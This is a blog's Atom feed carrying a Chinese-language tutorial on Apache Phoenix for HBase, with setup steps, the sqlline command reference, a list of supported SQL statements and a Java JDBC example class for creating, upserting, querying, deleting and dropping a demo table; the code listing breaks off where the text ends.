<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mars</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-11-05T10:36:03.057Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Fly Hugh</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2019/11/05/Phoenix/"/>
    <id>http://yoursite.com/2019/11/05/Phoenix/</id>
    <published>2019-11-05T09:08:14.181Z</published>
    <updated>2019-11-05T10:36:03.057Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Phoenix"><a href="#Phoenix" class="headerlink" title="Phoenix"></a>Phoenix</h1><p>Phoenix实践</p><a id="more"></a> <h2 id="Phoenix启动安装基本操作"><a href="#Phoenix启动安装基本操作" class="headerlink" title="Phoenix启动安装基本操作"></a>Phoenix启动安装基本操作</h2><p>二级索引支持(gobal index + local index)</p><p>编译SQL成为原生HBase的可并行执行的Scan</p><h3 id="Phoenix结构"><a href="#Phoenix结构" class="headerlink" title="Phoenix结构"></a>Phoenix结构</h3><p><img src="https://ws1.sinaimg.cn/large/bec9bff2ly1g8na3dl3cmj20yg0judjv.jpg" alt="4.jpg"></p><p>Phoenix在Hadoop生态系统中的位置</p><p><img src="https://ws1.sinaimg.cn/large/bec9bff2ly1g8na4y0qs7j20qy0fn769.jpg" alt="5.jpg"></p><p>HBase性能提升</p><p>hbase1.2性能能提：</p><p>1.2相对1.1，提升是十分显著的，在某些方面的额提升，延迟低了好几倍，</p><p>更别说Hive over HBase，Hive over Hbase的性能下，Phoenix的性能是这种的好多倍。</p><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p>配置：配置相对来说比较简单</p><p>Download：<a href="http://phoenix.apache.org/download.html，下载hbase对应版本的phoenix；解压bin.tar.gz包，拷贝**phoenix" target="_blank" rel="noopener">http://phoenix.apache.org/download.html，下载hbase对应版本的phoenix；解压bin.tar.gz包，拷贝**phoenix</a> server jar**包到hbase集群的每个region server 的lib目录下，然后重启hbase 集群。</p><p>phoniex 的启动命令是sqlline.py</p><p>使用bin/sqlline.py 172.16.0.128:2181连接上zk，就可以连接上HBase</p><h4 id="命令行操作"><a href="#命令行操作" class="headerlink" title="命令行操作"></a>命令行操作</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">!all               Execute the specified SQL against all the current connections</span><br><span class="line">!autocommit         Set autocommit mode on or off</span><br><span class="line">!batch             Start or execute a batch of statements</span><br><span class="line">!brief             Set verbose mode off</span><br><span class="line">!call               Execute a callable statement</span><br><span class="line">!close             Close the current connection to the database</span><br><span class="line">!closeall           Close all current open connections</span><br><span class="line">!columns           List all the columns for the specified table</span><br><span class="line">!commit             Commit the current transaction (if autocommit is off)</span><br><span class="line">!connect           Open a new connection to the database.</span><br><span class="line">!dbinfo             Give metadata information about the database</span><br><span class="line">!describe           Describe a table</span><br><span class="line">!dropall           Drop all tables in the current database</span><br><span class="line">!exportedkeys       List all the exported keys for the specified table</span><br><span class="line">!go                 Select the current connection</span><br><span class="line">!help               Print a summary of command usage</span><br><span class="line">!history           Display the command history</span><br><span class="line">!importedkeys       List all the imported keys for the specified table</span><br><span class="line">!indexes           List all the indexes for the specified table</span><br><span class="line">!isolation         Set the transaction isolation for this connection</span><br><span class="line">!list               List the current connections</span><br><span class="line">!manual             Display the SQLLine manual</span><br><span class="line">!metadata           Obtain metadata information</span><br><span class="line">!nativesql         Show the native SQL for the specified statement</span><br><span class="line">!outputformat       Set the output format for displaying results</span><br><span class="line">                  (table,vertical,csv,tsv,xmlattrs,xmlelements)</span><br><span class="line">!primarykeys       List all the primary keys for the specified table</span><br><span class="line">!procedures         List all the procedures</span><br><span class="line">!properties         Connect to the database specified in the properties file(s)</span><br><span class="line">!quit               Exits the program</span><br><span class="line">!reconnect         Reconnect to the database</span><br><span class="line">!record             Record all output to the specified file</span><br><span class="line">!rehash             Fetch table and column names for command completion</span><br><span class="line">!rollback           Roll back the current transaction (if autocommit is off)</span><br><span class="line">!run               Run a script from the specified file</span><br><span class="line">!save               Save the current variabes and aliases</span><br><span class="line">!scan               Scan for installed JDBC drivers</span><br><span class="line">!script             Start saving a script to a file</span><br><span class="line">!set               Set a sqlline variable</span><br><span class="line"></span><br><span class="line">Variable Value</span><br><span class="line">                  Description</span><br><span class="line">=============== ==========</span><br><span class="line">autoCommit true/false</span><br><span class="line">                  Enable/disable automatic</span><br><span class="line">transaction commit</span><br><span class="line">autoSave</span><br><span class="line">                   true/false Automatically save preferences</span><br><span class="line">color true/false</span><br><span class="line">                  Control whether color is used</span><br><span class="line">for display</span><br><span class="line">fastConnect</span><br><span class="line">                   true/false Skip building table/column list</span><br><span class="line">for</span><br><span class="line">                  tab-completion</span><br><span class="line">force true/false Continue running script</span><br><span class="line">                  even</span><br><span class="line">after errors</span><br><span class="line">headerInterval integer The interval between</span><br><span class="line">                  which</span><br><span class="line">headers are displayed</span><br><span class="line">historyFile path File in which to</span><br><span class="line">                  save command</span><br><span class="line">history. Default is</span><br><span class="line"><span class="meta">$</span>HOME/.sqlline/history</span><br><span class="line">                  (UNIX,</span><br><span class="line">Linux, Mac OS),</span><br><span class="line"><span class="meta">$</span>HOME/sqlline/history</span><br><span class="line">                  (Windows)</span><br><span class="line">incremental true/false Do not receive all rows</span><br><span class="line">                  from</span><br><span class="line">server before printing the first</span><br><span class="line">row. Uses fewer</span><br><span class="line">                  resources,</span><br><span class="line">especially for long-running</span><br><span class="line">queries, but column</span><br><span class="line">                  widths may</span><br><span class="line">be incorrect.</span><br><span class="line">isolation LEVEL Set transaction</span><br><span class="line">                  isolation level</span><br><span class="line">maxColumnWidth integer The maximum width to</span><br><span class="line">                  use when</span><br><span class="line">displaying columns</span><br><span class="line">maxHeight integer The maximum</span><br><span class="line">                  height of the</span><br><span class="line">terminal</span><br><span class="line">maxWidth integer The maximum width of</span><br><span class="line">                  the</span><br><span class="line">terminal</span><br><span class="line">numberFormat pattern Format numbers</span><br><span class="line">                  using</span><br><span class="line">DecimalFormat pattern</span><br><span class="line">outputFormat</span><br><span class="line">                  table/vertical/csv/tsv Format mode for</span><br><span class="line">result</span><br><span class="line">                  display</span><br><span class="line">propertiesFile path File from which SqlLine</span><br><span class="line">                  reads</span><br><span class="line">properties on startup; default</span><br><span class="line">                  is</span><br><span class="line"><span class="meta">$</span>HOME/.sqlline/sqlline.properties</span><br><span class="line">(UNIX, Linux, Mac</span><br><span class="line">                  OS),</span><br><span class="line"><span class="meta">$</span>HOME/sqlline/sqlline.properties</span><br><span class="line">(Windows)</span><br><span class="line">rowLimit</span><br><span class="line">                  integer Maximum number of rows returned</span><br><span class="line">from a query; zero</span><br><span class="line">                  means no</span><br><span class="line">limit</span><br><span class="line">showElapsedTime true/false Display execution</span><br><span class="line">                  time when</span><br><span class="line">verbose</span><br><span class="line">showHeader true/false Show column names in</span><br><span class="line">                  query</span><br><span class="line">results</span><br><span class="line">showNestedErrs true/false Display nested</span><br><span class="line">                  errors</span><br><span class="line">showWarnings true/false Display connection</span><br><span class="line">                  warnings</span><br><span class="line">silent true/false Be more silent</span><br><span class="line">timeout integer</span><br><span class="line">                  Query timeout in seconds; less</span><br><span class="line">than zero means no</span><br><span class="line">                  timeout</span><br><span class="line">trimScripts true/false Remove trailing spaces</span><br><span class="line">                  from</span><br><span class="line">lines read from script files</span><br><span class="line">verbose true/false Show</span><br><span class="line">                  verbose error messages and</span><br><span class="line">debug info</span><br><span class="line">!sql               Execute a SQL command</span><br><span class="line">!tables             List all the tables in the database</span><br><span class="line">!typeinfo           Display the type map for the current connection</span><br><span class="line">!verbose           Set verbose mode on</span><br><span class="line"></span><br><span class="line">Comments, bug reports, and patches go to ???</span><br></pre></td></tr></table></figure><p>这里面特别常见的有</p><p>!table 查看表</p><p>!quit 退出</p><p>平时命令行大多数都是输入SQL查看结果</p><p>对SQL的支持命令：</p><p>·         SELECT</p><p>·         UPSERT VALUES</p><p>·         UPSERT SELECT</p><p>·         DELETE</p><p>·         CREATE TABLE</p><p>·         DROP TABLE</p><p>·         CREATE FUNCTION</p><p>·         DROP FUNCTION</p><p>·         CREATE VIEW</p><p>·         DROP VIEW</p><p>·         CREATE SEQUENCE</p><p>·         DROP SEQUENCE</p><p>·         ALTER</p><p>·         CREATE INDEX</p><p>·         DROP SEQUENCE</p><p>·         ALTER</p><p>·         CREATE INDEX</p><p>·         DROP INDEX</p><p>·         ALTER INDEX</p><p>·         EXPLAIN</p><p>·         UPDATE STATISTICS</p><p>·         CREATE SCHEMA</p><p>·         USE</p><p>·         DROP SCHEMA</p><p>注意:在没有索引的情况下,针对大表使用非索引查询会非常耗时,很有可能会报超时错误.</p><h4 id="JDBC对Phoenix的基本操作"><a href="#JDBC对Phoenix的基本操作" class="headerlink" title="JDBC对Phoenix的基本操作"></a>JDBC对Phoenix的基本操作</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@Author</span> Administrator</span></span><br><span class="line"><span class="comment">* <span class="doctag">@create</span> 2019/9/9 17:13</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseDB</span> </span>&#123;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// load driver</span></span><br><span class="line">           Class.forName(<span class="string">"org.apache.phoenix.jdbc.PhoenixDriver"</span>);</span><br><span class="line"></span><br><span class="line">           <span class="comment">// get connection</span></span><br><span class="line">           <span class="comment">// jdbc 的 url 类似为 jdbc:phoenix [ :&lt;zookeeper quorum&gt; [ :&lt;port number&gt; ] [ :&lt;root node&gt; ] ]，</span></span><br><span class="line">           <span class="comment">// 需要引用三个参数：hbase.zookeeper.quorum、hbase.zookeeper.property.clientPort、and zookeeper.znode.parent，</span></span><br><span class="line">           <span class="comment">// 这些参数可以缺省不填而在 hbase-site.xml 中定义。</span></span><br><span class="line">           <span class="keyword">return</span> DriverManager.getConnection(<span class="string">"jdbc:phoenix:172.16.0.128:2181"</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       Connection conn = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// get connection</span></span><br><span class="line">           conn = BaseDB.getConnection();</span><br><span class="line"></span><br><span class="line">           <span class="comment">// check connection</span></span><br><span class="line">           <span class="keyword">if</span> (conn == <span class="keyword">null</span>) &#123;</span><br><span class="line">               System.out.println(<span class="string">"conn is null..."</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// check if the table exist</span></span><br><span class="line">           ResultSet rs = conn.getMetaData().getTables(<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="string">"USER"</span>,</span><br><span class="line">                   <span class="keyword">null</span>);</span><br><span class="line">           <span class="keyword">if</span> (rs.next()) &#123;</span><br><span class="line">               System.out.println(<span class="string">"table user is exist..."</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">           <span class="comment">// create sql</span></span><br><span class="line">           String sql = <span class="string">"CREATE TABLE user (id varchar PRIMARY KEY,INFO.account varchar ,INFO.passwd varchar)"</span>;</span><br><span class="line"></span><br><span class="line">           PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">           <span class="comment">// execute</span></span><br><span class="line">           ps.execute();</span><br><span class="line">           System.out.println(<span class="string">"create success..."</span>);</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   conn.close();</span><br><span class="line">              &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">upsert</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       Connection conn = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// get connection</span></span><br><span class="line">           conn = BaseDB.getConnection();</span><br><span class="line"></span><br><span class="line">           <span class="comment">// check connection</span></span><br><span class="line">           <span class="keyword">if</span> (conn == <span class="keyword">null</span>) &#123;</span><br><span class="line">               System.out.println(<span class="string">"conn is null..."</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// create sql</span></span><br><span class="line">           String sql = <span class="string">"upsert into user(id, INFO.account, INFO.passwd) values('001', 'admin', 'admin')"</span>;</span><br><span class="line"></span><br><span class="line">           PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">           <span class="comment">// execute upsert</span></span><br><span class="line">           String msg = ps.executeUpdate() &gt; <span class="number">0</span> ? <span class="string">"insert success..."</span></span><br><span class="line">                  : <span class="string">"insert fail..."</span>;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// you must commit</span></span><br><span class="line">           conn.commit();</span><br><span class="line">           System.out.println(msg);</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   conn.close();</span><br><span class="line">              &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       Connection conn = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// get connection</span></span><br><span class="line">           conn = BaseDB.getConnection();</span><br><span class="line"></span><br><span class="line">           <span class="comment">// check connection</span></span><br><span class="line">           <span class="keyword">if</span> (conn == <span class="keyword">null</span>) &#123;</span><br><span class="line">               System.out.println(<span class="string">"conn is null..."</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// create sql</span></span><br><span class="line">           String sql = <span class="string">"select * from user"</span>;</span><br><span class="line"></span><br><span class="line">           PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">           ResultSet rs = ps.executeQuery();</span><br><span class="line"></span><br><span class="line">           System.out.println(<span class="string">"id"</span> + <span class="string">"\t"</span> + <span class="string">"account"</span> + <span class="string">"\t"</span> + <span class="string">"passwd"</span>);</span><br><span class="line">           System.out.println(<span class="string">"======================"</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (rs != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                   System.out.print(rs.getString(<span class="string">"id"</span>) + <span class="string">"\t"</span>);</span><br><span class="line">                   System.out.print(rs.getString(<span class="string">"account"</span>) + <span class="string">"\t"</span>);</span><br><span class="line">                   System.out.println(rs.getString(<span class="string">"passwd"</span>));</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   conn.close();</span><br><span class="line">              &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       Connection conn = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// get connection</span></span><br><span class="line">           conn = BaseDB.getConnection();</span><br><span class="line"></span><br><span class="line">           <span class="comment">// check connection</span></span><br><span class="line">           <span class="keyword">if</span> (conn == <span class="keyword">null</span>) &#123;</span><br><span class="line">               System.out.println(<span class="string">"conn is null..."</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// create sql</span></span><br><span class="line">           String sql = <span class="string">"delete from user where id='001'"</span>;</span><br><span class="line"></span><br><span class="line">           PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">           <span class="comment">// execute upsert</span></span><br><span class="line">           String msg = ps.executeUpdate() &gt; <span class="number">0</span> ? <span class="string">"delete success..."</span></span><br><span class="line">                  : <span class="string">"delete fail..."</span>;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// you must commit</span></span><br><span class="line">           conn.commit();</span><br><span class="line">           System.out.println(msg);</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   conn.close();</span><br><span class="line">              &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">drop</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       Connection conn = <span class="keyword">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// get connection</span></span><br><span class="line">           conn = BaseDB.getConnection();</span><br><span class="line"></span><br><span class="line">           <span class="comment">// check connection</span></span><br><span class="line">           <span class="keyword">if</span> (conn == <span class="keyword">null</span>) &#123;</span><br><span class="line">               System.out.println(<span class="string">"conn is null..."</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// create sql</span></span><br><span class="line">           String sql = <span class="string">"drop table user"</span>;</span><br><span class="line"></span><br><span class="line">           PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">           <span class="comment">// execute</span></span><br><span class="line">           ps.execute();</span><br><span class="line"></span><br><span class="line">           System.out.println(<span class="string">"drop success..."</span>);</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   conn.close();</span><br><span class="line">              &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span 